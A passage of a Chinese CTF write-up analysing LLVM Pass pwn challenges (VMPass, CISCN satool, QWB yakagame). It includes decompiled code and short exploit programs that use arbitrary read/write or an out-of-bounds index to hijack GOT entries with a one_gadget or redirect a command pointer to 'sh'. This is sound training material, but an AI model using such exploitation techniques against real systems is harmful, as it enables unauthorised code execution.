class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::begin(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::end(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::operator!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator*(v5);</span><br><span class="line">    sub_6B80(a1, v3, <span class="number">1LL</span>);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其主要的逻辑又在于<code>sub_6B80</code></p><p>这个函数有点长就不完整放出来了,其内部主要在匹配<code>o0o0o0o0</code>函数的基本块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v39[<span class="number">0</span>] = llvm::BasicBlock::begin(a2);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v38 = llvm::BasicBlock::end(a2);</span><br><span class="line">  <span class="keyword">if</span> ( (llvm::operator!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">55</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br></pre></td></tr></table></figure><p>遍历所有的基本块<code>BasicBlock</code>,然后使用<code>llvm::dyn_cast</code>(其功能是动态类型转换),将基本块指针转化为<code>Instruction</code>指针</p><p>如果操作码是一个call系统调用(Opcode:55),则将<code>Instruction</code>指针动态类型转化为<code>CallBase</code>指针</p><p>并进入深一步的判断,主要是匹配各个被调用的函数名字</p><p>有如下可能<code>pop push store load add min</code>,每个都对应一个处理</p><p>操作的关键有两个变量<code>off_20DFD0</code>与<code>off_20DFc0</code></p><p>其是两个指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000000000020DFC0 88 E5 20 00 00 00 00 00       off_20DFC0 dq offset reg2            </span><br><span class="line">LOAD:000000000020DFD0 80 E5 20 00 00 00 00 00       off_20DFD0 dq offset reg1 </span><br></pre></td></tr></table></figure><p><code>add()</code>和<code>min()</code>是一对函数，会通过第一个参数确定所要操作的全局变量，然后将第二个参数的值加上或减去。</p><p>其可以用于修改寄存器的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v11 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = llvm::ConstantInt::getZExtValue(v9);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">      v10 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">      v10 = off_20DFC0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">    v6 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      *v10 -= llvm::ConstantInt::getZExtValue(v6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>store()</code>和<code>load()</code>也是一对函数，会将两个全局变量中的一个看作地址，并将地址中的值给另一个全局变量（<code>load()</code>任意地址读漏洞）或是将另一个全局变量中的值存放到这个地址中<code>store()</code>任意地址写漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">    v24 = <span class="number">0LL</span>;</span><br><span class="line">    v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = llvm::ConstantInt::getZExtValue(v23);</span><br><span class="line">      <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">        v24 = off_20DFD0;</span><br><span class="line">      <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">        v24 = off_20DFC0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">    &#123;</span><br><span class="line">      **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">    &#123;</span><br><span class="line">      **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>opt</code>一般是不会开<code>PIE</code>保护的，故这里可以考虑先利用任意地址读漏洞通过<code>opt</code>中任意一个函数的<code>got</code>表拿到<code>libc</code>地址，并用<code>add</code>和<code>min</code>函数对其修改，再利用任意地址写漏洞来劫持<code>opt</code>中的某个<code>got</code>表为<code>one_gadget</code>即可</p><p>这里选择<code>free</code>,因为每一次循环结束都会有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      <span class="built_in">free</span>(s1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">    v39,</span><br><span class="line">    <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp:</strong></p><p><code>./opt-8 -load ./VMPass.co -VMPass ./exp.ll</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void store(<span class="built_in">int</span> a);</span><br><span class="line">void load(<span class="built_in">int</span> a);</span><br><span class="line">void add(<span class="built_in">int</span> a, <span class="built_in">int</span> b);</span><br><span class="line"> </span><br><span class="line">void o0o0o0o0()&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);<span class="comment">#寄存器1变为0x77e100</span></span><br><span class="line">    load(<span class="number">1</span>);<span class="comment">#寄存器2获得0x77e100的值</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);<span class="comment">#寄存器2的值增加0x77e100</span></span><br><span class="line">    store(<span class="number">1</span>);<span class="comment">#寄存器1指向的值变为寄存器2的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>在打远程的时候，与内核和<code>QEMU</code>逃逸的题类似：将<code>exp.ll</code>或<code>exp.bc</code>通过<code>base64</code>加密传输到远程服务器，远程服务器会解码，并将得到的<code>LLVM IR</code>传给<code>LLVM</code>运行。</u></p><h2 id="2021ciscn-satool"><a href="#2021ciscn-satool" class="headerlink" title="2021ciscn-satool"></a>2021ciscn-satool</h2><p>题目给的文件还是老样子</p><p>直接ida打开SAPass.so,开始的start函数可以看到注册的Pass类就叫做<code>SAPass</code></p><p>根据之前说过的方法定位到重写的<code>RunOnFunction</code>函数为<code>sub_19D0</code></p><p>但这题的反编译结果要比上一题的复杂得多</p><p>虽然其中有很多是对非法信息的检测,只要我们正常编写程序都是不会触发的,所以可以忽略不计(嫌难看的话,因为这些报错代码都是连在一起的可以直接nop掉)</p><p>但就算这样代码也还是一坨,不过依据这类题目的尿性,以及自己做一些<u>调试</u>,就能判断出后面还是对<code>B4ckDo0r</code>函数内部调用的函数做判断</p><p>有如下可能<code>save takeway fakekey stealkey run</code></p><p>run中有一个特别显眼的块,调用了<code>byte_2040f8</code>指向的值作为函数指针调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    v4 = ((__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们就看一下这个全局变量是怎么来的,是否存在操作空间</p><p>可以注意到其是在<code>save</code>函数的处理中被赋值的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sub_2430(&amp;src, v20);</span><br><span class="line">sub_2430(v67, v24);</span><br><span class="line">v25 = n;</span><br><span class="line">v26 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">v26[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">byte_2040f8 = v26;</span><br><span class="line">v27 = (<span class="type">char</span> *)src;</span><br><span class="line"><span class="built_in">memcpy</span>(v26, src, v25);</span><br><span class="line">v28 = v26 + <span class="number">1</span>;</span><br><span class="line">v29 = (<span class="type">char</span> *)v67[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(v28, v67[<span class="number">0</span>], (<span class="type">size_t</span>)v67[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>但我们有必要知道<code>memcpy(v26, src, v25);</code>往堆块了写了什么</p><p>可以看出其来源是<code>sub_2430(&amp;src, v20);</code></p><p>这个函数大致一看就是往src里填充内容,但不太能知道<code>v20</code>是个啥,这时候可以进行一些调试,写一个<code>save(0x1,0x2,0x3,0x4.....);</code>这样的函数,然后去调试判断</p><p>在<code>stealkey</code>中有这么一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte_204100 = *byte_2040f8;</span><br></pre></td></tr></table></figure><p>然后在<code>fakekey</code>中又有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v59 = byte_204100;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v58 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::getSExtValue((llvm::APInt *)(*(_QWORD *)v58 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br><span class="line">byte_204100 = v59 + SExtValue;</span><br><span class="line">*byte_2040f8 = v59 + SExtValue;</span><br></pre></td></tr></table></figure><p><code>SExtValue</code>是我们传递的参数</p><p>也就是说我们可以在一定范围修改<code>byte_2040f8</code>的值,那么如果上面残余了libc的指针,就能够修改为onegadget</p><p>那么就要如何确保其上残余libc地址了</p><p>第一次malloc之前</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_164911.png" alt=""></p><p>那么我们只需要取一次chunk,之后的fd字段就会残余地址了</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">save(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">save(<span class="string">&quot;&quot;</span>, <span class="string">&quot;\n&quot;</span>);<span class="comment">//第一个参数为空字符串,是为了不将其复制到chunk中</span></span><br><span class="line">stealkey();</span><br><span class="line">fakekey(<span class="number">-0x1ecbf0</span>+<span class="number">0xe3afe</span>);</span><br><span class="line">run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2022qwb-yakagame"><a href="#2022qwb-yakagame" class="headerlink" title="2022qwb-yakagame"></a>2022qwb-yakagame</h2><p>不多说,直接打开<code>yaka.so</code>,找到注册的类名字是<code>ayaka</code></p><p>重写的ROF函数是<code>sub_C880</code></p><p>针对<code>gamestart</code>函数,然后内部又是一堆调用函数处理</p><p><code>fight</code>函数中存在一个后门</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (__int64)*score &gt; <span class="number">0x12345678</span> )</span><br><span class="line">  backdoor();</span><br></pre></td></tr></table></figure><p>不过需要当分数大于0x12345678才能调用</p><p>如何触发后门函数呢？<code>weaponlist[]</code>数组是<code>char</code>类型的，即单字节，就算比<code>boss</code>值要大，其差值也不可能大于<code>0x12345678</code>。</p><p>继续往后看，后面逆向也都不难，<code>merge</code>函数可以将一个<code>weaponlist</code>的值加到另一个上，<code>destroy</code>可以将指定<code>weaponlist</code>清零，<code>upgrade</code>可以将所有<code>weaponlist</code>的值都加上某一个数值。</p><p>接着，会有四个奇怪的函数，像是拼音，也不知道啥意思：<code>wuxiangdeyidao</code>，<code>zhanjinniuza</code>，<code>guobapenhuo</code>，<code>tiandongwanxiang</code>可以对<code>cmd</code>字符串中每个字符都进行同样的操作。由此可以想到，可通过这四个函数对<code>cmd</code>字符串原有的内容解密成某个命令。</p><p><code>cmd</code>开始是由<code>src</code>复制过来的，其中内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000011401                               ; const char src</span><br><span class="line">.rodata:0000000000011401 92                            src db 92h                              ; DATA XREF: sub_C880+6F↑o</span><br><span class="line">.rodata:0000000000011402 68                            db  68h ; h</span><br><span class="line">.rodata:0000000000011403 7B                            db  7Bh ; &#123;</span><br><span class="line">.rodata:0000000000011404 27                            db  27h ; &#x27;</span><br><span class="line">.rodata:0000000000011405 6D                            db  6Dh ; m</span><br><span class="line">.rodata:0000000000011406 93                            db  93h</span><br><span class="line">.rodata:0000000000011407 68                            db  68h ; h</span><br><span class="line">.rodata:0000000000011408 66                            db  66h ; f</span><br><span class="line">.rodata:0000000000011409 00                            db    0</span><br></pre></td></tr></table></figure><p>可以看到其中第二个和第七个字符一样，而那四个函数每次又是对所有字符做同样的操作，因此不难联想到最后解密成的命令很可能是<code>cat flag</code>，写个脚本爆破一下即可。不过这题实际上也不用如此，继续对后面进行分析就知道了。</p><p>后面就是一个<code>else</code>条件分支，也就是说当调用的函数不是上面提及的所有函数的时候，就会进入这个分支。这里用了<code>C++ STL</code>里的<code>map</code>，<code>map</code>可在任意类型的值之间建立映射关系，并且会按关键字从小到大排序。如：<code>map[&quot;abc&quot;] = 123</code>就将<code>abc</code>这个字符串与<code>123</code>这个数值间建立了映射关系，并且在通过迭代器遍历<code>map</code>的时候，关键字<code>abc</code>会在关键字<code>abd</code>之前遍历到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(v22, v58) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v23 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">          &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">          <span class="string">&quot;you really want this?all right,i will add it into the weapon list&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v23, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v24 = <span class="built_in">std</span>::_Rb_tree_iterator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::operator-&gt;(&amp;v34);</span><br><span class="line">  weaponlist[v33] = *(_BYTE *)(v24 + <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">++v33;</span><br></pre></td></tr></table></figure><p>在这个<code>else</code>分支中，会先遍历<code>map</code>，查找是否有调用的这个函数名作为<code>key</code>，其第一个参数作为<code>value</code>的映射关系。</p><p>若是有，则会将<code>weaponlist[]</code>数组下标对应<code>map</code>中此映射关系位置的值改为这个<code>value</code>。<strong>若没有，则会将这个新映射关系加入<code>map</code>中。</strong></p><p>我们注意到，此处的<code>v33</code>是有符号的<code>char</code>类型，其范围是<code>-128~127</code>，<u>故当<code>map</code>中映射关系很多的时候，<code>v33</code>会是负数，此处也就存在一个数组下标越界的漏洞了。</u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000002169A8                               public cmd</span><br><span class="line">.bss:00000000002169A8                               ; char *cmd</span><br><span class="line">.bss:00000000002169A8 ?? ?? ?? ?? ?? ?? ?? ??       cmd dq ?                                ; DATA XREF: LOAD:0000000000002468↑o</span><br><span class="line">.bss:00000000002169A8                                                                       ; .got:cmd_ptr↑o</span><br><span class="line">.bss:00000000002169B0                               public score</span><br><span class="line">.bss:00000000002169B0 ??                            score db    ? ;                         ; DATA XREF: LOAD:0000000000001340↑o</span><br><span class="line">.bss:00000000002169B0                                                                       ; .got:score_ptr↑o</span><br><span class="line">.bss:00000000002169B1 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B2 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B3 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B4 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B5 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B6 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B7 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B8 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B9 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BA ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BB ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BC ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BD ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BE ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BF ??                            db    ? ;</span><br><span class="line">.bss:00000000002169C0                               public weaponlist</span><br><span class="line">.bss:00000000002169C0                               ; char weaponlist[256]</span><br><span class="line">.bss:00000000002169C0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+weaponlist db 100h dup(?) </span><br></pre></td></tr></table></figure><p>如上图，可以看到<code>cmd</code>指针和<code>score</code>指针都在<code>weaponlist</code>之前，故可以通过这个数组下标越界漏洞，修改<code>score</code>指针的最后一字节[-16]，使其错位，从而指向很大的数字，触发后门函数。</p><p>由于<code>opt</code>没开<code>PIE</code>保护，故直接将<code>cmd</code>指针指向<code>opt</code>中的某个字符串末尾的<code>sh</code>即可</p><p>一个生成exp模板的脚本,对生成的文件进行微调即可完成要求</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">s = <span class="built_in">str</span>(i)</span><br><span class="line">s = <span class="string">&quot;0&quot;</span>*(<span class="number">3</span>-<span class="built_in">len</span>(s)) + s</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;void func&quot;</span> + s + <span class="string">&quot;(int x);&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">s = <span class="built_in">str</span>(i)</span><br><span class="line">s = <span class="string">&quot;0&quot;</span>*(<span class="number">3</span>-<span class="built_in">len</span>(s)) + s</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;func&quot;</span> + s + <span class="string">&quot;(0);&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="2022ciscn-satool"><a href="#2022ciscn-satool" class="headerlink" title="2022ciscn-satool"></a>2022ciscn-satool</h2><p>注册Pass叫做mba,重写的ROF函数是<code>`anonymous namespace&#39;::MBAPass::runOnFunction</code></p><p>函数真正需要关注的部分只有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mprotect(this[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">3</span>);</span><br><span class="line">`anonymous namespace<span class="number">&#x27;</span>::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29);</span><br><span class="line">mprotect(this[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">v27 = `anonymous namespace<span class="number">&#x27;</span>::MBAPass::callCode((_anonymous_namespace_::MBAPass *)this);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 